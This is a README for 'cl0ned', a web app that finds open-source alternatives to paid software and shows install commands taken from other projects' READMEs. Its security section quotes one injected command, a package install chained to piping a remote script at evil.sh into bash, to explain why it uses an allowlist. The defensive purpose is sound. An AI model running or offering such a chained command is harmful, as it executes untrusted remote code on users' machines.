[README(1).md](https://github.com/user-attachments/files/32867071/README.1.md)
# cl0ned

**Live:** [cl0ned.vercel.app](https://cl0ned.vercel.app)

I got tired of paying a subscription for everything. A lot of paid apps have a free, open-source version out there somewhere, but finding one means digging through GitHub and then figuring out how to actually install it. cl0ned does that part for you.

Type in something you pay for (Notion, Photoshop, TeamViewer, whatever) and it searches GitHub for open-source alternatives, shows you the license on every result, and tells you the easiest way to get each one running on your computer.

<!-- screenshot here -->

## What it does

- **Live GitHub search** for alternatives to the tool you typed in.
- **License on every result.** Repos with no license or an unclear one get flagged, since "open source" doesn't mean much without one.
- **"Get it running" panel** on each result. It checks the repo's releases, README and project files and picks the easiest option for your OS: a direct download, a package manager command (Homebrew, winget, Snap, npm, pip…), Docker, or build-from-source steps as a last resort.
- **Everything is marked Unverified.** I haven't built a safety checker yet, so the app doesn't pretend the downloads are safe.

## Security stuff I had to think about

The install panel shows commands with a copy button, and those commands come from other people's READMEs. That's a problem, because a README could hide something like `brew install coolapp && curl evil.sh | bash` inside what looks like a normal install line.

So the app only shows a command if it fully matches a strict allowlist pattern (known package managers, a plain package name, a few known flags, nothing after it). `docker run` commands only allow listed flags, so things like `--privileged` or mounting your whole drive get rejected. Anything that doesn't match just links you to the README instead. There are tests for this, including the attack examples, in `src/lib/setup.test.ts`.

The search API is also rate limited per IP (10 searches a minute, stored in Upstash Redis), so one person or bot can't burn through my GitHub API quota for everyone.

## Tech

- Next.js + TypeScript + React
- GitHub REST API
- Upstash Redis (rate limiting)
- Motion (animations)
- Deployed on Vercel

## Running it locally

You need Node.js and a GitHub token (a fine-grained one with public-repo read access is enough).

```bash
git clone https://github.com/mattjlourens-ctrl/cl0ned.git
cd cl0ned
npm install
```

Make a `.env.local` file in the project folder:

```
GITHUB_TOKEN=your_token_here
```

Then:

```bash
npm run dev
```

and open http://localhost:3000.

Upstash is optional locally. Without it, searches just aren't rate limited in development. In production the app refuses to search if the limiter isn't set up, on purpose. To use it, add `UPSTASH_REDIS_REST_URL` and `UPSTASH_REDIS_REST_TOKEN` (or the `KV_REST_API_URL` / `KV_REST_API_TOKEN` names Vercel sets).

Run the tests with:

```bash
npm test
```

## What's next

- **A real safety check** for the repos and downloads, so the Unverified tags can go away.
- **Paste all your subscriptions at once** and get an alternative for each, plus how much you'd save per year.
- **A hand-picked list for the most popular subscriptions.** Raw GitHub search misses some obvious ones (it didn't find GIMP or Krita for Photoshop), so the popular tools should have curated answers with search as the fallback.

## How I built it

I built this with Claude Code as my coding partner. I made the product and design decisions and reviewed what it wrote, and every decision, mistake and fix is written down in [`BUILD_LOG.md`](BUILD_LOG.md) if you want to see how it came together.
